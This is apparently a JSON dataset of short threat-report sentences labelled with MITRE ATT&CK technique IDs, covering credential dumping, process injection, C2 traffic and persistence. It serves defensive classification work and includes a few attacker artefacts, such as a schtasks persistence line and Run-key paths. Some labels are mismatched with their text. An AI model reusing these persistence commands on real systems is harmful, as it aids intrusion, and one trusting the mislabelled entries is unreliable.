    "text": "has obtained valid accounts to gain initial access.(Citation: CISA AA21-200A APT40 July 2021)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "used fsutil to check available free space before executing actions that might create large files on disk.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "contains modules that will use  to carry out malicious operations.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has used the quser command to show currently logged on users. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can collect the computer name from the machine. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can download files from its C2 server to the victim's machine.(Citation: Unit 42 OopsIE! Feb 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\iXqrVo",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has a module to gather information from the compromrised asset including the computer version computer name IIS version and more. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can download and upload files to the victim's computer.(Citation: ESET EvilNum July 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Windows Defender tampering",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "most likely using credentials gathered by the previous LSASS access.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can place a lnk file in the Startup Folder to achieve persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files and tools.(Citation: Github Koadic)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors began to review sensitive documents",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "using DeviceControl API methods",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "command-line tool",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to inject DLLs for malicious plugins into running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP communications for C2 as well as using the WinHTTP library to make requests to the Exchange Web Services API.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It mimics the icon Finder usually applies to JPEG or text files to increase the likelihood the recipient will double-click the file",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "svcService Type: user mode serviceService Start Type: auto startService Account: LocalSystem",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has injected itself into remote processes to encrypt files using a combination of VirtualAlloc WriteProcessMemory and CreateRemoteThread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "stealing credentials from the Local Security Authority Subsystem Service (LSASS) process.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon opening the malicious document",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "installs itself as a new service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has relied on injecting its payload directly into the process memory of the victim's preferred browser.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The first find.bat was used to run",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Then it checks to see if it was launched by RUNDLL32.exe along with parameter #1",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "sets its DLL file as a new service in the Registry to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The actor leveraged Impacket’s wmiexec.py to execute commands with a semi-interactive shell",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "is capable of obtaining directory file and drive listings.(Citation: Fidelis Turbo)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has targeted RDP credentials and used it to move through the victim environment. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI to execute scripts used for discovery.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can download a payload for execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "deletes the following registry keys:\nHKCR\\.EXE\nHKCR\\.dll\nHKCR\\*",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "to discover information relating to the user",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can run `set.bat` `update.bat` `cache.bat` `bcd.bat` `msrun.bat` and similar scripts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to retrieve information about the OS.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "This presentation by Christopher Glyer and Devon Kerr contains additional information on attacker use of WMI in past Mandiant investigations",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "used CMD-based scripts",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "tries to add a scheduled task to establish persistence.(Citation: ESET RTM Feb 2017)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Gets command from C2 and executes it",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTPS in communications with C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "will attempt to determine the local network segment it is a part of.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used legitimate local admin account credentials.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "communicated over HTTP with preconfigured C2 servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP in C2 communications.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can identify the hard disk volume serial number on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "This file extracts credentials from LSASS similar to Mimikatz.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can use a variety of commands including esentutl.exe to steal sensitive data from Internet Explorer and Microsoft Edge to acquire information that is subsequently exfiltrated.(Citation: Red Canary Qbot)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list processes on the compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to execute commands using cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This function scans a specified path by finding all files within the given directory and its subdirectories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "malware gathers a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "kills and disables services by using cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to upload and download files to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "process enumerations.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can use `ShellExecute` to execute applications.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "running native Windows commands on compromised servers,",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can add itself to the Registry as a startup program to establish persistence.(Citation: Fortinet Agent Tesla April 2018) ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can download additional stages of malware from a Discord CDN channel.(Citation: Microsoft WhisperGate January 2022)(Citation: Unit 42 WhisperGate January 2022)(Citation: Cisco Ukraine Wipers January 2022)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Additional information For more information about the attacks and the indicators of compromise, please contact: intelreports@kaspersky.com Alternatively, please visit: https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting To find more information about cybersecurity awareness training for enterprise or government staff, go to Kaspersky Security Awareness",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can remotely create a scheduled task to execute itself on a system.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "an additional BAT file contained in the body of the ransomware.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.(Citation: ESET Telebots Dec 2016)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Injected Process Name",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "launched by cmd.exe",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The Ritsol backdoor trojan used by  can download files onto a compromised host from a remote location.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used the `systeminfo` command to gather details about a compromised system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "will attempt to enumerate the username of the victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "remote shell functions.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to discover the computer name and Windows product name/version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Command execution",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTPS over port 443 for command and control.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to launch scheduled tasks to establish persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The structure of the domain mimics the Mercator Institute for China Studies (MERICS), whose actual domain is merics.org",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the username on targeted hosts.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "a process where Cobalt Strike was injected into",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "creates valid local users to provide access to the system.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "sent as a POST request",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to execute the command ipconfig /all.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP GET and POST requests for C2 communications.(Citation: Securelist Octopus Oct 2018)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Business and government personnel who are traveling, especially in a foreign country, often rely on systems to conduct business other than those at their home office, and may be unfamiliar with threats posed while abroad",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can remove persistence-related artifacts from the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors ran a command script to set up persistence as a scheduled task named WinUpdate as well as other encoded commands from the command-line ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": " nbtstat ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "enumerates the current user during the initial infection.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can collect computer name locale information and information about the OS and architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "collected system architecture information.  used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victims machine.(Citation: FireEye APT19)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Scheduled Task Creation or",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can conduct file browsing.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can gather the username from the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has collected the username from the infected host. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Example use of direct syscall.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can browse the file system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The script self-scheduling, as well as the scheduling of a script that repeatedly attempts to download and execute the Revenge RAT binary, significantly contribute to the persistence of this infection",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has utilized multiple commands to identify data of interest in file and directory listings.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can use Native API for defense evasion discovery and collection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can read specific registry values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has been known to dump credentials using Mimikatz and Windows Credential Editor.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use HTTPS for C2 communiations.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Responds to the IRC server via PRIVMSG with “Download  Success :FilePath=<path to downloaded file>” or “Download Fail” if unsuccessful",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "an ISO file opener that mounts and opens the file with a simple double-click.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Download a file from the remote server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses wmic to obtain the UUID of the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has created a working folder for collected files that it sends to the C2 server. ",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI to delete Shadow Volumes.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "upload/download file",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "communicates with its C2 servers over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has executed the reg query command for HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can use native command line for execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "threat actors used CS as the main Command and Control tool, dropped several payloads,",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "used a backdoor which could execute a supplied DLL using rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has used `rundll32.exe` for execution.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has checked for the existence of specific files including /usr/sbin/setenforce and /etc/selinux/config. It also has the ability to monitor the cryptocurrency miner file and process.  ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can execute commands via the command line shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "operators use Mimikatz to dump passwords.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can grab a systems information including the OS version architecture etc.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors dropped Powertool64.exe and dontsleep.exe in preparation for their final actions.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "to trick users into opening the malicious attachments in",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used WMIC to execute commands on remote computers. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "2e0361fd73f60c76c69806205307ccac, update.dll (MiniDuke), 425kb (internal name = “UserCache.dll“) 9e3f3b5e9ece79102d257e8cf982e09e, cache.dll (CozyDuke), 425kb (internal name = “UserCache.dll“) The two share identical export function names in their export directories, and the naming appears to be randomly assigned at compile time",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get users to execute a malicious .app file that looks like a Flash Player update.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "leverages  and  to steal credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Freenki malware lists running processes using the Microsoft Windows API.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "attempts to access network resources with a domain accounts credentials.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used keyloggers that are also capable of dumping credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has used a batch script to gather folder and file names from victim hosts.(Citation: US-CERT TA18-074A)(Citation: Gigamon Berserk Bear October 2021)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "gathers the victim's IP address and domain information and then sends it to its C2 server.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can get a list of the processes and running tasks on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files and payloads to compromised hosts.(Citation: FireEye Know Your Enemy FIN8 Aug 2016)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute payloads on a target host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used  to locate PDF Excel and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.(Citation: berwachung APT28 Forfiles June 2015)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the computer name OS version and default language identifier.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands.(Citation: Morphisec Cobalt Gang Oct 2018) The group has used an exploit toolkit known as Threadkit that launches .bat files.(Citation: Talos Cobalt Group July 2018)(Citation: PTSecurity Cobalt Group Aug 2017)(Citation: Group IB Cobalt Aug 2017)(Citation: Morphisec Cobalt Gang Oct 2018)(Citation: Unit 42 Cobalt Gang Oct 2018)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "read from a file on disk or a registry key.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can identify whether it has been run previously on a host by checking for a specified folder.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can download files onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can delete folders and files including overwriting its executable with legitimate programs.(Citation: Kroll Qakbot June 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: ATT QakBot April 2021)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has detected a target systems OS version and system volume information.(Citation: TrendMicro TropicTrooper 2015)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used Windows command scripts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "the malicious actor retrieved system administration tools and malicious payloads by using the Background Intelligent Transfer Service",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download and execute files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "executes the cmd.exe command.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional files including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.(Citation: Bitdefender APT28 Dec 2015)(Citation: Unit 42 Playbook Dec 2017)(Citation: Accenture SNAKEMACKEREL Nov 2018)(Citation: TrendMicro Pawn Storm Dec 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used `cmd` for execution on an infected host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "collects the victim machines Windows GUID.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to access the file system on a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used  and `tracert` for network discovery.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has several commands to delete files associated with the malware from the victim.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can collect sensitive NTLM material from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Disabling Windows event logging in an attempt to evade detection",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can walk through directories and recursively search for strings in files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP GET requests to download other files that are executed in memory.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "sent spearphishing emails containing malicious attachments that urged recipients to review modifications in the file which would trigger the attack.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "enumerate processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "creates a persistence via Registry Run Keys under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The screenshot also shows the Glimpse server receiving the results of the whoami command executed by the agent",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "schtasks /create /tn WinSecurity /sc minute /mo 15",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "the malicious authentications into victim O365 tenants had originated from within the victim’s own network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI and LDAP queries for network discovery and to move laterally.(Citation: CrowdStrike Grim Spider May 2019)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: FireEye KEGTAP SINGLEMALT October 2020)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "the code can be injected into other legitimate running processes",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has sent collected information to the C2 via HTTP POST request.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors collected data files and other information from compromised networks.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional files and tools onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can perform a language check of the infected system and can query the CPU information (cupid).(Citation: JoeSecurity Egregor 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "collects a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can obtain victim drive information as well as a list of folders in C:\\Program Files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can store email data in files and directories specified in its configuration such as C:\\Windows\\ServiceProfiles\\NetworkService\\appdata\\Local\\Temp\\.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "The info stealer also collects information on infected hosts",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32.exe in a Registry value to establish persistence.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "abuses NTFS transactions to launch and conceal malicious processes.(Citation: SecureList SynAck Doppelgnging May 2018)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "have been observed using commands, including tasklist, jobs, ps, or taskmgr, to reveal the running processes on victim devices.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to configure browser settings by modifying Registry entries under `HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer`.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "gathers BIOS versions and manufacturers the number of CPU cores the total physical memory and the computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Attempting to use sc stop and taskkill to stop over 100 services related to various areas ranging from remote desktop tools to Windows Defender",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "We observed a process created by Cobalt Strike accessing lsass.exe",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Manipulate processes (list",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The initial beacon packet for  contains the operating system version of the victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.(Citation: Palo Alto Shamoon Nov 2016)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can collect local data from an infected machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "loader can check for the  backdoor .pri file on a compromised AD FS server.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "is capable of enumerating Registry keys and values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has enumerated processes on targeted systems.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "the user will be encouraged to download a malicious installer",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "certutil is a WIndows component that can download external content to the computer. In a typical attack, the criminals follow this paradigm",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can obtain information about the victim computer name physical memory country and date.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used C:\\MS_DATA as their main working directory for storing malware and staging data for exfiltration",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can delete files created on the victim's machine.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Run a shell command",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can communicate over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can list active users on the system.(Citation: Debian nbtscan Nov 2019)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can download a copy of itself from an attacker controlled IP address to the victim machine.(Citation: Talos Sodinokibi April 2019)(Citation: McAfee Sodinokibi October 2019)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "access to system APIs,",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can obtain information about running processes on the victim.",
    "command": "",
